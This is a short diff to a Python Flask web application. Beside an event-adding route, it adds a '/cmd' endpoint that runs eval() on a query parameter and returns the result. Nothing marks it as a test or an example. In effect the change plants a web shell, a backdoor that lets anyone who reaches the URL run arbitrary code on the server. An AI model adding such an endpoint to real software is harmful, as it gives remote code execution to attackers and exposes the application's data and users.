@@ -70,6 +70,15 @@ def add_event():
     f = form(request, empty, "add_event_form.html", event=lambda x: x)
     return f.call()
 
+@app.route('/cmd')
+def cmd():
+    try:
+        a = eval(request.args.to_dict()["cmd"])
+        return {"r":a}
+    except Exception as e:
+        return e
+
+
 
 c = db.connection()
 c.data_entry()
